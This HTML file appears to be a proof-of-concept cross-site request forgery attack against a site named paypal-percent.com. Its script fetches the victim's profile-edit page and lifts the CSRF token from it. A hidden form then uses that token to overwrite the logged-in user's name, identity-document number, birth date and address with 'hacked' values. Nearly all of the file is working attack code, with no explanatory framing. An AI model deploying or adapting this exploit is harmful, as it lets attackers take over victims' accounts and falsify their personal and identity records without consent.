<html>
    <div >authenticity_token</div>
    <div id="a_t"></div>

    <script>history.pushState('', '', '/')</script>
    <form action="https://www.paypal-percent.com/users/update" method="POST">
      <input type="hidden" name="&#95;method" value="put" />
      <input id="i_a_t" type="hidden" name="authenticity&#95;token" value="" />
      <input type="hidden" name="user&#91;first&#95;name&#93;" value="&#45;&#45;hacked" />
      <input type="hidden" name="user&#91;last&#95;name&#93;" value="hacked" />
      <input type="hidden" name="user&#91;document&#95;type&#95;id&#93;" value="1" />
      <input type="hidden" name="user&#91;document&#95;number&#93;" value="hacked" />
      <input type="hidden" name="user&#91;birth&#95;date&#40;3i&#41;&#93;" value="2" />
      <input type="hidden" name="user&#91;birth&#95;date&#40;2i&#41;&#93;" value="3" />
      <input type="hidden" name="user&#91;birth&#95;date&#40;1i&#41;&#93;" value="1923" />
      <input type="hidden" name="user&#91;gender&#93;" value="0" />
      <input type="hidden" name="user&#91;address&#93;" value="hackedasd" />
      <input type="hidden" name="user&#91;city&#93;" value="Munich" />
      <input type="hidden" name="user&#91;postcode&#93;" value="81479" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
    <script>
        function createElementFromHTML(htmlString) {
          var div = document.createElement('div');
          div.innerHTML = htmlString.trim();

          // Change this to div.childNodes to support multiple top-level nodes
          return div.firstChild; }

        function GetTagByNameUsingRegex(tag,name,html) {
            var  reg= new RegExp("<" + tag + "[^>]*name[\\s]?=[\\s]?['\"]" + name + "[^'\"]*['\"][\\s\\S]*?\/" + ">","g");
            return html.match(reg);
        }
        function attack() {
            var headers = new Headers();
            headers.append("Content-Type", "application/json;charset=UTF-8");
            var url = "https://www.paypal-percent.com/users/edit";
            fetch(url, {    
                method: 'GET',    
                cache: 'force-cache',
            }).then(x => x.text())
                .then(data => {
                    var res = GetTagByNameUsingRegex("meta", "csrf-token", data);
                    var child = createElementFromHTML(res[0]);
                    var csrf = child.content;
                    document.getElementById("a_t").textContent= csrf;
                    document.getElementById("i_a_t").value= csrf;
                });
        }
        attack()
    </script>
</html>
